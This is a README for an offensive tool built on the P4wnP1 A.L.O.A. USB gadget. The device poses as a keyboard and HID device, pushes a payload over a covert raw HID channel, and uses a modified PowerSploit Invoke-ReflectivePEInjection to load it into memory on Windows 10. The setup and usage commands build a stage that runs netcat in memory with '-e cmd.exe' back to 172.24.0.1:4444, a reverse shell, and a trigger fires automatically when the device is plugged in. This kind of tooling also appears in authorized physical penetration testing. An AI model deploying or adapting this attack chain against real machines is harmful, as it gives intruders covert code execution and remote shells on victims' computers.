# Reflective PE Injection using HID covert channel

### Description

Use a Covert RAW HID channel to deliver a payload to a windows machine and load it to memory using [powersploit "Invoke-ReflectivePEInjection"](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/)

- The Invoke-ReflectivePEInjection.ps1 in this repository has been modified to work on Windows 10.

## Requirements

- Copy the "**Injection.sh**" script to `/usr/local/P4wnP1/scripts/`
- chmod `root@kali:/usr/local/P4wnP1/scripts# chmod 755 Injection.sh`
- Copy the "**Invoke-ReflectivePEInjection.ps1**" payload to `/usr/local/P4wnP1/legacy/`
- Copy the "**StageGenerator.py**" script to `/usr/local/P4wnP1/legacy/`
- Copy the "**Stage1.js**" to `/usr/local/P4wnP1/HIDScripts/`
- Generate Stage2 payload (netcat Reflective PE Injection) `root@kali:/usr/local/P4wnP1/legacy# python2 StageGenerator.py /usr/share/windows-binaries/nc.exe "172.24.0.1 4444 -e cmd.exe"`

## Configuration

**Create a USB setting template with the following settings:**

- Keyboard
- Custom HID device
- Vendor ID: `0x1d6b`
- Product ID: `0x1315`
- Manufacturer Name: `MaMe82`
- Product Name: `P4wnP1 by MaMe82`
- Serial Number: `deadbeef1337`

_If you want to use other VID/PID you will need to update the values in Stage1.js and Stage2.ps1_

**Store the template under the name "Injection"**

**Create a trigger action** that starts the bash script "Injection.sh" when USB gadget connected to host, **Store the template under the name "Injection"**

**Create a master template** with the following settings:

- TriggerActions Template: `Injection`
- USB Template: `Injection`
- WiFi Template: `startup`
- Bluetooth Template: `startup`
- Networks templates: `bteth_startup, usbeth_startup, wlan0_startup_dhcp_server`

## Execution

- Connect to the P4wnP1 A.L.O.A web interface (using the access point ip "172.24.0.1") and deploy the master template "**Injection**"
- SSH into your P4wnP1 A.L.O.A access point ip "172.24.0.1" and run the following command: `root@kali:~# screen -d -r backdoor`

## StageGenerator.py

You can use **StageGenerator.py** generate a Reflective PE Injection payload using any executable file and deliver it using the P4wnP1 raw HID covert channel.

Just make sure the **Invoke-ReflectivePEInjection.ps1** file is in the same directory as **StageGenerator.py**

### Usage:

`root@kali:/usr/local/P4wnP1/legacy# python2 StageGenerator.py "PE_EXECUTABLE_FILE_PATH" "EXECUTABLE_FILE_ARGUMENTS"`

Example With Arguments:

`root@kali:/usr/local/P4wnP1/legacy# python2 StageGenerator.py /tmp/netcat.exe "172.24.0.1 4444 -e cmd.exe"`

Example Without Arguments:

`root@kali:/usr/local/P4wnP1/legacy# python StageGenerator.py /tmp/netcat.exe ""`
